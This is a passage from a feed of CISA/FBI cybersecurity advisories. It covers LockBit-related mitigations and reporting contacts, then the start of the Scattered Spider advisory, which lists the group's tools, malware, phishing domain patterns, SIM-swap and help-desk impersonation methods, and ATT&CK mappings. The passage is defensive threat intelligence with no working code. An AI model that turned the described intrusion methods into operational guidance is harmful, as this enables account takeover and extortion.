PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 1.E, 2.S, 2.T</a>].</li>\n<li><strong>Enable enhanced PowerShell logging </strong>[<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.T, 2.U</a>].\n<ul><li>PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.</li>\n<li>Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).</li>\n<li>The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.</li>\n</ul></li>\n</ul><ul><li><strong>Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations </strong>requiring administrator privileges to reduce the risk of lateral movement by PsExec.</li>\n<li><strong>Implement a recovery plan </strong>to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).</li>\n<li><strong>Require all accounts </strong>with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with <a href=\"https://pages.nist.gov/800-63-3/\" title=\"Digital Identity Guidelines\">NIST's standards</a> for developing and managing password policies.\n<ul><li>Use longer passwords consisting of at least 15 characters [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.B</a>].</li>\n<li>Store passwords in hashed format using industry-recognized password managers.</li>\n<li>Add password user “salts” to shared login credentials.</li>\n<li>Avoid reusing passwords [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.C</a>].</li>\n<li>Implement multiple failed login attempt account lockouts [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.G</a>].</li>\n<li>Disable password “hints.\"</li>\n<li>Require administrator credentials to install software.</li>\n</ul></li>\n<li><strong>Keep all operating systems, software, and firmware up to date. </strong>Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">known exploited vulnerabilities</a> in internet-facing systems [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 1.E</a>].\n<ul><li>Upgrade vulnerable NetScaler ADC and Gateway appliances to the latest version available to lower the risk of compromise.</li>\n</ul></li>\n</ul><h3>VALIDATE SECURITY CONTROLS</h3>\n<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Table 1).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>CISA and the authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3>RESOURCES</h3>\n<ul><li><a href=\"https://www.stopransomware.gov/\" title=\"#StopRansomware\">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>\n<li>The <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\" title=\"#StopRansomware Guide\">Joint Ransomware Guide</a> provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.</li>\n<li><a href=\"https://www.cisa.gov/cyber-hygiene-services\" title=\"Cyber Hygiene Services\">Cyber Hygiene Services</a> and <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\" title=\"Ransomware Readiness Assessment CSET v10.3\">Ransomware Readiness Assessment</a> provide no-cost cyber hygiene and ransomware readiness assessment services.</li>\n<li>For more resources to help aid in the mitigation of cyber threats and ransomware attacks visit <a href=\"https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents\" title=\"Strategies to Mitigate Cyber Security Incidents\">Strategies to Mitigate Cyber Security Incidents</a>, <a href=\"https://www.cyber.gov.au/report-and-recover/recover-from/ransomware/protect-yourself-from-ransomware\" title=\"Protect yourself from ransomware\">Protect yourself from Ransomware</a>, and <a href=\"https://www.cyber.gov.au/report-and-recover/how-asdacsc-can-help-during-cyber-security-incident#:~:text=Cyber%20security%20incidents%20can%20be,Scanning%20and%20reconnaissance\" title=\"How the ASD's ACSC can help during a cyber security incident\">How the ASD’s ACSC can help during a Cyber Security Incident</a>.</li>\n</ul><h3>REPORTING</h3>\n<p>The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with LockBit 3.0 affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at <a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complaint Center (IC3)\">ic3.gov</a>, <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center at <a href=\"mailto:report@cisa.gov?subject=Ransomware%20Incident\" title=\"Report to CISA\">report@cisa.gov</a> or (888) 282-0870.</p>\n<p>Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD’s ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to <a href=\"https://www.cyber.gov.au/\" title=\"Australian Signals Directorate Australian Cyber Security Centre\">cyber.gov.au</a>.</p>\n<h3>DISCLAIMER</h3>\n<p>The information in this report is being provided “as is” for informational purposes only. CISA and authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring organizations.</p>\n<h3>ACKNOWLEDGEMENTS</h3>\n<p>Boeing contributed to this CSA.</p>\n<h3>REFERENCES</h3>\n<p>[1] <a href=\"https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\" title=\"NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966\">NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966</a><br />\n[2] <a href=\"https://www.mcafee.com/learn/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/\" title=\"What is Mshta, How Can it Be Used and How to Protect Against it\">What is Mshta, How Can it Be Used and How to Protect Against it (McAfee)</a><br />\n[3] <a href=\"https://www.mandiant.com/resources/blog/session-hijacking-citrix-cve-2023-4966\" title=\"Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-4966)\">Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-4966</a><u>)</u></p>\n<p> </p>\n<h3>VERSION HISTORY</h3>\n<p>November 21, 2023: Initial version.</p>\n<p> </p>\n<p> </p>\n","pubDate":"Tue, 21 Nov 2023 08:50:48 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20369"}},{"title":"Scattered Spider","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a","description":"<h3><strong>SUMMARY</strong></h3>\n<p>The Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) in response to recent activity by Scattered Spider threat actors against the commercial facilities sectors and subsectors. This advisory provides tactics, techniques, and procedures (TTPs) obtained through FBI investigations as recently as November 2023.</p>\n<p>Scattered Spider is a cybercriminal group that targets large companies and their contracted information technology (IT) help desks. Scattered Spider threat actors, per trusted third parties, have typically engaged in data theft for extortion and have also been known to utilize BlackCat/ALPHV ransomware alongside their usual TTPs.</p>\n<p>The FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of a cyberattack by Scattered Spider actors.</p>\n<p>Download the PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-11/aa23-320a_scattered_spider_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-320A Scattered Spider</a>\n    <span class=\"c-file__size\">(PDF,       510.78 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 14. See the MITRE ATT&amp;CK<sup>®</sup> Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>\n<h4><strong>Overview</strong></h4>\n<p>Scattered Spider (also known as Starfraud, UNC3944, Scatter Swine, and Muddled Libra) engages in data extortion and several other criminal activities.[<a href=\"https://attack.mitre.org/versions/v14/groups/G1015/\" title=\"Scattered Spider\">1</a>] Scattered Spider threat actors are considered experts in social engineering and use multiple social engineering techniques, especially phishing, push bombing, and subscriber identity module (SIM) swap attacks, to obtain credentials, install remote access tools, and/or bypass multi-factor authentication (MFA). According to public reporting, Scattered Spider threat actors have [<a href=\"https://www.trellix.com/en-us/about/newsroom/stories/research/scattered-spider-the-modus-operandi.html\" title=\"Scattered Spider: The Modus Operandi\">2</a>],[<a href=\"https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/\" title=\"Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies\">3</a>],[<a href=\"https://www.crowdstrike.com/blog/scattered-spider-attempts-to-avoid-detection-with-bring-your-own-vulnerable-driver-tactic/\" title=\"SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security\">4</a>]:</p>\n<ul><li>Posed as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees and gain access to the network [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1598/\" title=\"Phishing for Information\">T1598</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1656/\" title=\"Impersonation\">T1656</a>].</li>\n<li>Posed as company IT and/or helpdesk staff to direct employees to run commercial remote access tools enabling initial access [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1204/\" title=\"User Execution\">T1204</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/\" title=\"Phishing\">T1566</a>].</li>\n<li>Posed as IT staff to convince employees to share their one-time password (OTP), an MFA authentication code.</li>\n<li>Sent repeated MFA notification prompts leading to employees pressing the “Accept” button (also known as MFA fatigue) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a>].[<a href=\"https://www.malwarebytes.com/blog/personal/2023/09/ransomware-group-steps-up-issues-statement-over-mgm-resorts-compromise\" title=\"Ransomware group steps up, issues statement over MGM Resorts compromise\">5</a>]</li>\n<li>Convinced cellular carriers to transfer control of a targeted user’s phone number to a SIM card they controlled, gaining control over the phone and access to MFA prompts.</li>\n<li>Monetized access to victim networks in numerous ways including extortion enabled by ransomware and data theft [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a>].</li>\n</ul><p>After gaining access to networks, the FBI observed Scattered Spider threat actors using publicly available, legitimate remote access tunneling tools. Table 1 details a list of legitimate tools Scattered Spider, repurposed and used for their criminal activity. <strong>Note:</strong> The use of these legitimate tools alone is not indicative of criminal activity. Users should review the Scattered Spider indicators of compromise (IOCs) and TTPs discussed in this CSA to determine whether they have been compromised.</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: Legitimate Tools Used by Scattered Spider</em></caption>\n<thead><tr><td>\n<p><strong>Tool</strong></p>\n</td>\n<td>\n<p><strong>Intended Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>Fleetdeck.io</p>\n</td>\n<td>\n<p>Enables remote monitoring and management of systems.</p>\n</td>\n</tr><tr><td>\n<p>Level.io</p>\n</td>\n<td>\n<p>Enables remote monitoring and management of systems.</p>\n</td>\n</tr><tr><td>\n<p>Mimikatz [<a href=\"https://attack.mitre.org/versions/v14/software/S0002/\" title=\"Mimikatz\">S0002</a>]</p>\n</td>\n<td>\n<p>Extracts credentials from a system.</p>\n</td>\n</tr><tr><td>\n<p>Ngrok [<a href=\"https://attack.mitre.org/versions/v14/software/S0508/\" title=\"ngrok\">S0508</a>]</p>\n</td>\n<td>\n<p>Enables remote access to a local web server by tunneling over the internet.</p>\n</td>\n</tr><tr><td>\n<p>Pulseway</p>\n</td>\n<td>\n<p>Enables remote monitoring and management of systems.</p>\n</td>\n</tr><tr><td>\n<p>Screenconnect</p>\n</td>\n<td>\n<p>Enables remote connections to network devices for management.</p>\n</td>\n</tr><tr><td>\n<p>Splashtop</p>\n</td>\n<td>\n<p>Enables remote connections to network devices for management.</p>\n</td>\n</tr><tr><td>\n<p>Tactical.RMM</p>\n</td>\n<td>\n<p>Enables remote monitoring and management of systems.</p>\n</td>\n</tr><tr><td>\n<p>Tailscale</p>\n</td>\n<td>\n<p>Provides virtual private networks (VPNs) to secure network communications.</p>\n</td>\n</tr><tr><td>\n<p>Teamviewer</p>\n</td>\n<td>\n<p>Enables remote connections to network devices for management.</p>\n</td>\n</tr></tbody></table><p>In addition to using legitimate tools, Scattered Spider also uses malware as part of its TTPs. See Table 2 for some of the malware used by Scattered Spider.</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: Malware Used by Scattered Spider</em></caption>\n<thead><tr><td>\n<p><strong>Malware</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>AveMaria (also known as WarZone [<a href=\"https://attack.mitre.org/versions/v14/software/S0670/\" title=\"WarzoneRAT\">S0670</a>])</p>\n</td>\n<td>\n<p>Enables remote access to a victim’s systems.</p>\n</td>\n</tr><tr><td>\n<p>Raccoon Stealer</p>\n</td>\n<td>\n<p>Steals information including login credentials [<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0006/\" title=\"Credential Access\">TA0006</a>], browser history [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1217/\" title=\"Browser Information Discovery\">T1217</a>], cookies [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1539/\" title=\"Steal Web Session Cookie\">T1539</a>], and other data.</p>\n</td>\n</tr><tr><td>\n<p>VIDAR Stealer</p>\n</td>\n<td>\n<p>Steals information including login credentials, browser history, cookies, and other data.</p>\n</td>\n</tr></tbody></table><p>Scattered Spider threat actors have historically evaded detection on target networks by using living off the land techniques and allowlisted applications to navigate victim networks, as well as frequently modifying their TTPs.</p>\n<p>Observably, Scattered Spider threat actors have exfiltrated data [<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0010/\" title=\"Exfiltration\">TA0010</a>] after gaining access and threatened to release it without deploying ransomware; this includes exfiltration to multiple sites including U.S.-based data centers and MEGA[.]NZ [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a>].</p>\n<h4><strong>Recent Scattered Spider TTPs</strong></h4>\n<h5><em><strong>New TTP - File Encryption</strong></em></h5>\n<p>More recently, the FBI has identified Scattered Spider threat actors now encrypting victim files after exfiltration [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. After exfiltrating and/or encrypting data, Scattered Spider threat actors communicate with victims via TOR, Tox, email, or encrypted applications.</p>\n<h5><em><strong>Reconnaissance, Resource Development, and Initial Access</strong></em></h5>\n<p>Scattered Spider intrusions often begin with broad phishing [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/\" title=\"Phishing\">T1566</a>] and smishing [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1660/\" title=\"Phishing (Mobile)\">T1660</a>] attempts against a target using victim-specific crafted domains, such as the domains listed in Table 3 [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/001/\" title=\"Acquire Infrastructure: Domains\">T1583.001</a>].</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: Domains Used by Scattered Spider Threat Actors</em></caption>\n<thead><tr><td>\n<p><strong>Domains</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>victimname-sso[.]com</p>\n</td>\n</tr><tr><td>\n<p>victimname-servicedesk[.]com</p>\n</td>\n</tr><tr><td>\n<p>victimname-okta[.]com</p>\n</td>\n</tr></tbody></table><p>In most instances, Scattered Spider threat actors conduct SIM swapping attacks against users that respond to the phishing/smishing attempt. The threat actors then work to identify the personally identifiable information (PII) of the most valuable users that succumbed to the phishing/smishing, obtaining answers for those users’ security questions. After identifying usernames, passwords, PII [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1589/\" title=\"Gather Victim Identity Information\">T1589</a>], and conducting SIM swaps, the threat actors then use social engineering techniques [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1656/\" title=\"Impersonation\">T1656</a>] to convince IT help desk personnel to reset passwords and/or MFA tokens [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1199/\" title=\"Trusted Relationship\">T1199</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/004/\" title=\"Phishing: Spearphishing Voice\">T1566.004</a>] to perform account takeovers against the users in single sign-on (SSO) environments.</p>\n<h5><em><strong>Execution, Persistence, and Privilege Escalation</strong></em></h5>\n<p>Scattered Spider threat actors then register their own MFA tokens [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1606/\" title=\"Forge Web Credentials\">T1606</a>] after compromising a user’s account to establish persistence [<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0003/\" title=\"Persistence\">TA0003</a>]. Further, the threat actors add a federated identity provider to the victim’s SSO tenant and activate automatic account linking [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1484/002/\" title=\"Domain Policy Modification: Domain Trust Modification\">T1484.002</a>]. The threat actors are then able to sign into any account by using a matching SSO account attribute. At this stage, the Scattered Spider threat actors already control the identity provider and then can choose an arbitrary value for this account attribute. As a result, this activity allows the threat actors to perform privileged escalation [<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0004/\" title=\"Privilege Escalation\">TA0004</a>] and continue logging in even when passwords are changed [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>]. Additionally, they leverage common endpoint detection and response (EDR) tools installed on the victim networks to take advantage of the tools’ remote-shell capabilities and executing of commands which elevates their access. They also deploy remote monitoring and management (RMM) tools [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>] to then maintain persistence.</p>\n<h5><em><strong>Discovery, Lateral Movement, and Exfiltration</strong></em></h5>\n<p>Once persistence is established on a target network, Scattered Spider threat actors often perform discovery, specifically searching for SharePoint sites [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1213/002/\" title=\"Data from Information Repositories: Sharepoint\">T1213.002</a>], credential storage documentation [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials In Files\">T1552.001</a>], VMware vCenter infrastructure [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>], backups, and instructions for setting up/logging into Virtual Private Networks (VPN) [<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0007/\" title=\"Discovery\">TA0007</a>]. The threat actors enumerate the victim’s Active Directory (AD), perform discovery and exfiltration of victim’s code repositories [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1213/003/\" title=\"Data from Information Repositories: Code Repositories\">T1213.003</a>], code-signing certificates [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/004/\" title=\"Unsecured Credentials: Private Keys\">T1552.004</a>], and source code [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a>],[<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0010/\" title=\"Exfiltration\">TA0010</a>]. Threat actors activate Amazon Web Services (AWS) Systems Manager Inventory [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1538/\" title=\"Cloud Service Dashboard\">T1538</a>] to discover targets for lateral movement [<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0007/\" title=\"Discovery\">TA0007</a>],[<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0008/\" title=\"Lateral Movement\">TA0008</a>], then move to both preexisting [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1021/007/\" title=\"Remote Services: Cloud Services\">T1021.007</a>] and actor-created [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1578/002/\" title=\"Modify Cloud Compute Infrastructure: Create Cloud Instance\">T1578.002</a>] Amazon Elastic Compute Cloud (EC2) instances. In instances where the ultimate goal is data exfiltration, Scattered Spider threat actors use actor-installed extract, transform, and load (ETL) tools [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1648/\" title=\"Serverless Execution\">T1648</a>] to bring data from multiple data sources into a centralized database [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1074/\" title=\"Data Staged\">T1074</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1530/\" title=\"Data from Cloud Storage\">T1530</a>]. According to trusted third parties, where more recent incidents are concerned, Scattered Spider threat actors may have deployed BlackCat/ALPHV ransomware onto victim networks—thereby encrypting VMware Elastic Sky X integrated (ESXi) servers [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>].</p>\n<p>To determine if their activities have been uncovered and maintain persistence, Scattered Spider threat actors often search the victim’s Slack, Microsoft Teams, and Microsoft Exchange online for emails [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/\" title=\"Email Collection\">T1114</a>] or conversations regarding the threat actor’s intrusion and any security response. The threat actors frequently join incident remediation and response calls and teleconferences, likely to identify how security teams are hunting them and proactively develop new avenues of intrusion in response to victim defenses. This is sometimes achieved by creating new identities in the environment [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/\" title=\"Create Account\">T1136</a>] and is often upheld with fake social media profiles [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1585/001/\" title=\"Establish Accounts: Social Media Accounts\">T1585.001</a>] to backstop newly created identities.</p>\n<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<p>See Tables 4 through 17 for all referenced threat actor tactics and techniques in this advisory.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 4: Reconnaissance</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Gather Victim Identity Information</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1589/\" title=\"Gather Victim Identity Information\">T1589</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors gather usernames, passwords, and PII for targeted organizations.</p>\n</td>\n</tr><tr><td>\n<p>Phishing for Information</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1598/\" title=\"Phishing for Information\">T1598</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use phishing to obtain login credentials, gaining access to a victim’s network.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 5: Resource Development</em></caption>\n<thead><tr><td>\n<p><strong>Technique Title</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>Acquire Infrastructure: Domains</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/001/\" title=\"Acquire Infrastructure: Domains\">T1583.001</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors create domains for use in phishing and smishing attempts against targeted organizations.</p>\n</td>\n</tr><tr><td>\n<p>Establish Accounts: Social Media Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1585/001/\" title=\"Establish Accounts: Social Media Accounts\">T1585.001</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors create fake social media profiles to backstop newly created user accounts in a targeted organization.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 6: Initial Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Phishing</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/\" title=\"Phishing\">T1566</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use broad phishing attempts against a target to obtain information used to gain initial access.</p>\n<p>Scattered Spider threat actors have posed as helpdesk personnel to direct employees to install commercial remote access tools.</p>\n</td>\n</tr><tr><td>\n<p>Phishing (Mobile)</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1660/\" title=\"Phishing (Mobile)\">T1660</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors send SMS messages, known as smishing, when targeting a victim.</p>\n</td>\n</tr><tr><td>\n<p>Phishing: Spearphishing Voice</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/004/\" title=\"Phishing: Spearphishing Voice\">T1566.004</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use voice communications to convince IT help desk personnel to reset passwords and/or MFA tokens.</p>\n</td>\n</tr><tr><td>\n<p>Trusted Relationship</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1199/\" title=\"Trusted Relationship\">T1199</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors abuse trusted relationships of contracted IT help desks to gain access to targeted organizations.</p>\n</td>\n</tr><tr><td>\n<p>Valid Accounts: Domain Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors obtain access to valid domain accounts to gain initial access to a targeted organization.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 7: Execution</em></caption>\n<thead><tr><td>\n<p><strong>Technique Title</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>Serverless 